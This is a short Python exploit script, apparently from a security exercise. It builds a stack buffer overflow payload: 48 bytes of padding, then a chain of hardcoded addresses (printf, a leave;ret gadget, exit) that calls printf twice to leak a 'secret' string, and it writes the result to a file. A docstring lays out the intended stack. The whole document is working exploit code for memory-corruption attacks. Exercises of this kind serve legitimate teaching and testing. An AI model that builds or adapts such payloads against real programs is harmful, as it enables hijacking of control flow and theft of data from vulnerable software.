#!/usr/bin/env python

"""
Want to call printf("%s\n", &secret) twice.
num args for printf = 2.

buffer
...
$ebp + 4     <- ebp
&printf
&leave; ret;
&fmt_string = $ebp + 9
&secret
&printf
&exit
&fmt_string = $ebp + 9
&secret
fmt_string
"""

buff = '\x38\xd3\xff\xff'
ebp = '\x68\xd3\xff\xff'
base_offset = 48 # $ebp - &buff
ebp_4 = '\x78\xd3\xff\xff'
ebp_9 = '\x8c\xd3\xff\xff'
printf = '\x60\x8c\xe3\xf7'
leave_ret = '\xff\x84\x04\x08'
exit = '\x60\x80\xe1\xf7'
secret = '\x03\xd4\xff\xff'

with open('abc', 'w') as f:
    f.write(
        '0' * base_offset + \
        ebp_4 + \
        printf + \
        leave_ret + \
        ebp_9 + \
        secret + \
        printf + \
        exit + \
        ebp_9 + \
        secret + \
        '%s\n'
    )
